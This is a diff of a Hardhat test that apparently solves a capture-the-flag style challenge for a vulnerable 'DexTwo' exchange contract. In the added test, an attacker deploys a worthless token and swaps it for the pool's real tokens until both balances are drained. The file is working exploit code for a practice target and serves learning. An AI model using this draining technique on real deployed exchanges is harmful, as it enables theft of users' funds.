@@ -1,41 +1,127 @@
+const { ethers } = require("hardhat");
 const { expect } = require("chai");
 
-describe("DexTwo contract", function () {
-  it("Should drain all token1 and token2", async function () {
-    const [owner] = await ethers.getSigners();
+const CONTRACT_NAME = "DexTwo";
 
-    // Deploy FakeToken contract
-    const FakeToken = await ethers.getContractFactory("FakeToken");
-    const fakeToken1 = await FakeToken.deploy(10000);
-    const fakeToken2 = await FakeToken.deploy(10000);
+describe(CONTRACT_NAME, () => {
+  let owner;
+  let attacker;
+  let contract;
+  let token1;
+  let token2;
+  let tx;
 
-    // Deploy DexTwo contract
-    const DexTwo = await ethers.getContractFactory("DexTwo");
-    const dexTwo = await DexTwo.deploy(fakeToken1.address, fakeToken2.address);
+  beforeEach(async () => {
+    // get signers
+    [owner, attacker] = await ethers.getSigners();
 
-    // Mint some fake tokens and approve DexTwo to spend them
-    await fakeToken1.approve(dexTwo.address, ethers.constants.MaxUint256);
-    await fakeToken2.approve(dexTwo.address, ethers.constants.MaxUint256);
+    // deploy DexTwo contract
+    const factory = await ethers.getContractFactory(CONTRACT_NAME);
+    contract = await factory.deploy();
+    await contract.deployed();
 
-    // Transfer 1 fake token to DexTwo for initial liquidity
-    await fakeToken1.transfer(dexTwo.address, 1);
-    await fakeToken2.transfer(dexTwo.address, 1);
-
-    // Swap fake tokens for real tokens
-    await dexTwo.swap(fakeToken1.address, fakeToken2.address, 100);
-    await dexTwo.swap(fakeToken2.address, fakeToken1.address, 100);
-
-    // Check that all real tokens have been drained
-    const token1Balance = await dexTwo.balanceOf(
-      fakeToken1.address,
-      dexTwo.address
+    // deploy Token1
+    const token1Factory = await ethers.getContractFactory("SwappableTokenTwo");
+    token1 = await token1Factory.deploy(
+      contract.address,
+      "Token 1",
+      "TKN1",
+      110
     );
-    const token2Balance = await dexTwo.balanceOf(
-      fakeToken2.address,
-      dexTwo.address
-    );
+    await token1.deployed();
 
-    expect(token1Balance).to.equal(0);
-    expect(token2Balance).to.equal(0);
+    // deploy Token2
+    const token2Factory = await ethers.getContractFactory("SwappableTokenTwo");
+    token2 = await token2Factory.deploy(
+      contract.address,
+      "Token 2",
+      "TKN2",
+      110
+    );
+    await token2.deployed();
+
+    // set tokens in the DexTwo contract
+    tx = await contract.setTokens(token1.address, token2.address);
+    await tx.wait();
+
+    // approve the contract to manage Token1
+    tx = await token1["approve(address,address,uint256)"](
+      owner.address,
+      contract.address,
+      100
+    );
+    await tx.wait();
+
+    // approve the contract to manage Token2
+    tx = await token2["approve(address,address,uint256)"](
+      owner.address,
+      contract.address,
+      100
+    );
+    await tx.wait();
+
+    // add liquidity to DexTwo contract for Token1
+    tx = await contract.add_liquidity(token1.address, 100);
+    await tx.wait();
+
+    // add liquidity to DexTwo contract for Token2
+    tx = await contract.add_liquidity(token2.address, 100);
+    await tx.wait();
+
+    // transfer some Token1 to the attacker
+    tx = await token1.transfer(attacker.address, 10);
+    await tx.wait();
+
+    // transfer some Token2 to the attacker
+    tx = await token2.transfer(attacker.address, 10);
+    await tx.wait();
+
+    // let the attacker control the contract
+    contract = contract.connect(attacker);
+  });
+
+  it("Solves the challenge", async () => {
+    // attacker approves the contract to manage their tokens
+    tx = await contract.approve(contract.address, 100000);
+    await tx.wait();
+
+    // attacker deploys their own token
+    const attackerTokenFactory = await ethers.getContractFactory(
+      "SwappableTokenTwo"
+    );
+    const attackerToken = await attackerTokenFactory
+      .connect(attacker)
+      .deploy(contract.address, "Attack on Token", "AOT", 100000);
+    await attackerToken.deployed();
+
+    // attacker approves the contract to manage their own token
+    tx = await attackerToken["approve(address,address,uint256)"](
+      attacker.address,
+      contract.address,
+      100000
+    );
+    await tx.wait();
+
+    // attacker transfers some of their own token to the contract
+    tx = await attackerToken.transfer(contract.address, 1);
+    await tx.wait();
+
+    // attacker swaps their own token for Token1
+    tx = await contract.swap(attackerToken.address, token1.address, 1);
+    await tx.wait();
+
+    // attacker transfers more of their own token to the contract
+    tx = await attackerToken.transfer(contract.address, 8);
+    await tx.wait();
+
+    // attacker swaps their own token for Token2
+    tx = await contract.swap(attackerToken.address, token2.address, 10);
+    await tx.wait();
+
+    // check if the contract has been drained of Token1
+    expect(await token1.balanceOf(contract.address)).to.eq(0);
+
+    // check if the contract has been drained of Token2
+    expect(await token2.balanceOf(contract.address)).to.eq(0);
   });
 });
